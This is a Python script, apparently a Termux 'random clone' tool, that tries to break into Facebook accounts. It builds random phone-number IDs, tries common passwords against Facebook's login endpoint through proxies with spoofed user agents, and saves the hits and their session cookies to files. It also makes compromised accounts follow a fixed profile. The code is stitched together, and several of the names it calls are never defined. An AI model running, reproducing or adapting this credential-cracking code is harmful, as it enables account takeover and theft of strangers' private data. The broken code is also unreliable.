
# Définir le numéro de version
version_actuelle = "1.5"



import os
import random
import string 
import uuid
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import sys
import secrets
import getpass

# Mot de passe pour déverrouiller le script
mot_de_passe = "ITACHI2024"

# Demander à l'utilisateur de saisir le mot de passe
saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")

# Vérifier si le mot de passe saisi est correct
if saisie_mot_de_passe == mot_de_passe:
    print("Mot de passe correct. Exécution de git pull...")
    # Exécuter la commande git pull
    try:
        subprocess.run(["git", "pull"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution de git pull : {e}")
        exit(1)
    print("Git pull terminé avec succès !")

#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
# Liste des couleurs pour le logo, les lignes et chaque mot
logo_colors = [B, C, P, H]
line_colors = [bblack, M, H, byellow, bblue, P, C, B]
word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
#-------------logo-----------------#
logo ="""
##     ## ######## ########  ##     ## 
 ##   ##  ##       ##     ##  ##   ##  
  ## ##   ##       ##     ##   ## ##   
   ###    ######   ########     ###    
  ## ##   ##       ##   ##     ## ##   
 ##   ##  ##       ##    ##   ##   ##  
##     ## ######## ##     ## ##     ## 

[+]==============================================
[+] CREATED BY   :  ARYANxROHIT
[+] FB GROUP     :  TERMUX TEAM INP COMMAND 
[+] ON GITHUB    :  XERX-XD
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]=============================================="""

xxxx = str(len(ugen))
#---------------------[LOOP MENU]---------------------#
loop = 0
oks = []
cps = []
baby =[]

#---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;97m====================================================') 
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
    
    		
def xerx():
    os.system("clear")
    print(logo)
    
    print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
    print(49*'=')
    aryan = input("✓CHOOSE>")
    if aryan =='1':xerx1()
    elif aryan =='2':xerx2()
    elif aryan =='3':xerx3()
    elif aryan =='4':xerx4()
    elif aryan =='5':xerx5()
    elif aryan =='6':xerx6()
    elif aryan =='7':os.system("xdg-open https://www.facebook.com/aaryan.chaudhary69")
    else:
        print("SELECT CORRECT OPTION")
        xerx()
    
def xerx1():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	os.system("clear")
	print(logo)
	print("                CHOOSE METHOD                       ")
	print("[+]==============================================")
	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
	print(49*'=')
	xerxfire = input("[+] [CHOOSE] :- ")
	os.system("clear")
	print(logo)
	print("                TRY SOMETHING NEW                       ")
	print("[+]==============================================")
	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
	print("[+]==============================================")
	xerxlovesyou = input("[+] [CHOOSE] :- ")
	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
		xerx_xd.append('y')
	else:
		xerx_xd.append('n')
	print("[+]==============================================")
	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
	print("[+]==============================================")
	xerxtop = input("[+] [CHOOSE] :- ")
	if xerxtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(f"[+] TOTAL IDZ  : "+tl+" ")
		print(f"[+] CODE CHOOSED : "+kode)
		print(f'[+] METHOD CHOOSED : M{xerxfire}')
		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
			    yaari.submit(p,uid,pwx,tl)
			
	print(47*"-")
	print('[✓] CRACKING COMPLETED ')
	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	print('[?] Ids saved in XERX-OK.txt,XERX-CP.txt')
	input("DO YOU WANT TO GO BSCK MENU ")
	xerx()
	print(47*"-")
#------------ method crack def ---------#
def x(uid,pwx,tl):
	global loop
	global oks
	global cps
	global ugen
	try:
		for ps in pwx:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://x.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'x.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': pro}
			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[XERX-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/XERX-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[XERX-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/XERX-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/XERX-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				
				open('/sdcard/XERX-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-XERX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
#-------------end----------------#

# Générateur de séquence aléatoire
def generate_random_sequence(length):
    sequence = [random.choice(string.digits) for _ in range(length)]
    return sequence

# Appel à la fonction MR_ITACHI pour démarrer le programme
MR_ITACHI()
